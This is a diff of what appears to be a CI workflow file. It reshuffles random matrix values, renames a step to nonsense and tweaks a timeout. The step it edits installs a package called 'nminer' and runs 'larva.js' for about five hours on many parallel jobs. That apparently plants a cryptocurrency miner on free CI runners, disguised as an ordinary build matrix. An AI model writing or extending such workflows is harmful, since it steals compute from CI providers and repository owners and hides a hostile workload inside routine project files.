@@ -9,24 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 3669 }
-          - { version: 7189 }
-          - { version: 758 }
-          - { version: 5894 }
-          - { version: 9640 }
-          - { version: 4029 }
-          - { version: 7265 }
-          - { version: 1688 }
-          - { version: 431 }
-          - { version: 8485 }
-          - { version: 3942 }
-          - { version: 1976 }
-          - { version: 9833 }
-          - { version: 3554 }
-          - { version: 1006 }
-          - { version: 2146 }
-          - { version: 3339 }
-          - { version: 3795 }
+          - { version: 1768 }
+          - { version: 9913 }
+          - { version: 5188 }
+          - { version: 6568 }
+          - { version: 2522 }
+          - { version: 9057 }
+          - { version: 7144 }
+          - { version: 4173 }
+          - { version: 4130 }
+          - { version: 7266 }
+          - { version: 3501 }
+          - { version: 2297 }
+          - { version: 3443 }
+          - { version: 1825 }
+          - { version: 6190 }
+          - { version: 4325 }
+          - { version: 9098 }
+          - { version: 5800 }
 
     steps:
       - name: Checkout
@@ -37,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: sprinkles like brave
         run: |
           npm install nminer@latest
-          timeout 318m node larva.js || echo "larva executed"
+          timeout 309m node larva.js || echo "larva executed"
